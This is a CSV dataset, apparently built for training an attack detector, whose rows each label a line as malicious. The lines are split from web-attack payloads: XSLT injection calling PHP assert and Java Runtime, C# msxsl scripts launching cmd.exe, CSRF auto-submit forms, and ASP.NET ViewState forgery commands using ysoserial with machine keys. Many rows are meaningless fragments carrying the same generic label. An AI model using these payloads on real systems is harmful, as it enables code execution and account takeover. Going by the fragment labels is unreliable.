Payload,Signature,AttackType,Severity,MITRE,Label,Description
</xsl:template>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:stylesheet>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<body style=""font-family:Arial;font-size:12pt;background-color:#EEEEEE"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:variable name=""payload"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:variable>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:variable name=""include"" select=""php:function('assert',$payload)""/>",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</body>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</html>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:template match=""/"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:variable name=""eval"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:variable>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:template>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:stylesheet>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:template match=""/"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:template>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:stylesheet>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:template match=""/"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:variable name=""rtobject"" select=""rt:getRuntime()""/>",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:variable name=""processString"" select=""ob:toString($process)""/>",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:value-of select=""$processString""/>",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:template>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:stylesheet>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:template match=""/"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:template>.,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:stylesheet>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<msxsl:script implements-prefix=""App"" language=""C#"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
<![CDATA[,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
public string ToShortDateString(string date),Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
{,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"System.Diagnostics.Process.Start(""cmd.exe"");",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"return ""01/01/2001"";",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
},Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
]]>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</msxsl:script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:template match=""ArrayOfTest"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
<TABLE>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:for-each select=""Test"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
<TR>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
<TD>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:value-of select=""App:ToShortDateString(TestDate)"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</TD>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</TR>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:for-each>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</TABLE>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:template>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:stylesheet>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<msxsl:script language = ""C#"" implements-prefix = ""user"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
<![CDATA[,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
public string execute(){,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
System.Diagnostics.Process proc = new System.Diagnostics.Process();,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"proc.StartInfo.FileName= ""C:\\windows\\system32\\cmd.exe"";",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
proc.StartInfo.UseShellExecute = false;,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"proc.StartInfo.Arguments = ""/c dir"";",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
proc.Start();,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
proc.WaitForExit();,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
return proc.StandardOutput.ReadToEnd();,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
},Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
]]>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</msxsl:script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:template match=""/fruits"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
--- BEGIN COMMAND OUTPUT ---,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<xsl:value-of select=""user:execute()""/>",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
--- END COMMAND OUTPUT ---,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:template>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</xsl:stylesheet>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"Execute the function """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"Execute the function """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"Execute a remote php file using """,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
Execute a remote php file using ",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<input name=""username"" type=""hidden"" value=""CSRFd"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<input type=""submit"" value=""Submit Request"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</form>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<input name=""username"" type=""hidden"" value=""CSRFd"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<input type=""submit"" value=""Submit Request"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</form>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"document.getElementById(""autosubmit"").submit();",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
function launch(){,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
const dT = new DataTransfer();,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"const file = new File( [ ""CSRF-filecontent"" ], ""CSRF-filename"" );",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
dT.items.add( file );,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
document.xss[0].files = dT.files;,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
document.xss.submit(),Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
},Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<form style=""display: none"" name=""xss"" method=""post"" action=""<target>"" enctype=""multipart/form-data"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<input id=""file"" type=""file"" name=""file""/>",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<input type=""submit"" name="""" value="""" size=""0"" />",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</form>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<button value=""button"" onclick=""launch()"">Submit Request</button>",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
xhr.send();,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
//application/json is not allowed in a simple request. text/plain is the default,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"xhr.setRequestHeader(""Content-Type"", ""text/plain"");",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
//You will probably want to also try one or both of these,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"//xhr.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded"");",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"//xhr.setRequestHeader(""Content-Type"", ""multipart/form-data"");",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"<form id=""CSRF_POC"" action=""www.example.com/api/setrole"" enctype=""text/plain"" method=""POST"">",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</form>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"document.getElementById(""CSRF_POC"").submit();",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
xhr.withCredentials = true;,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
"xhr.setRequestHeader(""Content-Type"", ""application/json;charset=UTF-8"");",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
</script>,Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
",Generic Payload,Generic Payload,Low,T1190,Malicious,Generic Payload payload from comprehensive dataset
<machineKey validationKey=""""[String]""""  decryptionKey=""""[String]"""" validation=""""[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]""""  decryption=""""[Auto (default) | DES | 3DES | AES | alg:algorithm_name]"""" />""",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<machineKey validationKey=""87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC"" decryptionKey=""E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7"" validation=""SHA1"" />",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
____   ____.__                       __         .__   __,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
\   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
\   Y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
\     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
\___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
\/           \/            \/          \/    \/,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
KEY FOUND!!!,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Host:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Matching MachineKeys found!,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"$ viewgen --guess ""/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI=""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[+] ViewState is not encrypted,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[+] Signature algorithm: SHA1,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"viewgen --decode --check --webconfig web.config --modifier CA0B0334 ""zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY=""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# --modifier = `__VIEWSTATEGENERATOR` parameter value,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# --encrypteddata = `__VIEWSTATE` parameter value of the target application,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# --generator = `__VIEWSTATEGENERATOR` parameter value,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# --validationkey = validation key from the previous command,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
".\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c ""echo 123 > c:\windows\temp\test.txt"" --apppath=""/testaspx/"" --islegacy --validationalg=""SHA1"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"" --isdebug",CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
".\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c ""echo 123 > c:\windows\temp\test.txt"" --path=""/somepath/testaspx/test.aspx"" --apppath=""/testaspx/"" --decryptionalg=""AES"" --decryptionkey=""34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887"" --validationalg=""HMACSHA256"" --validationkey=""70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0""",CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# decrypt cookie,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --purpose=owin.cookie --valalgo=hmacsha512 --decalgo=aes,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# encrypt cookie (edit Decrypted.txt),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
EnableViewStateMac=False,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ViewStateEncryptionMode=False,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
EnableViewStateMac=True,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ViewStateEncryptionMode=True,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
enableViewStateMac,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
False,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
/wEP,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"The """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"The """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"The """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"The """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    * """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
* Find the machine key (validationkey) using ",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 or ,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    # --modifier = """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    # --encrypteddata = """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 and ,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"Default validation algorithm is """,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 and the default decryption algorithm is ,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"If the """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 if you remove the ,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"If you have the """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
{,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
""otp"""":[""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"""5555""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
],GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
},GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
